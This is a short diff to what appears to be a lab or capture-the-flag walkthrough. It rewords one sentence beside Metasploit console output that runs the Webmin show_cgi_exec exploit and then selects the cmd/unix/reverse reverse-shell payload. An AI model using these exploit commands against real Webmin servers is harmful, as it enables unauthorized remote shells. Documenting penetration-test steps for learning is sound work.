@@ -302,7 +302,7 @@ msf exploit(unix/webapp/webmin_show_cgi_exec) > run
 [+] Payload executed successfully
 [*] Exploit completed, but no session was created.
 ```
-Failed here next tried payload 6:
+Assumed failed, but more on that after this next try with payload 6:
 ```
 msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload 6
 payload => cmd/unix/reverse
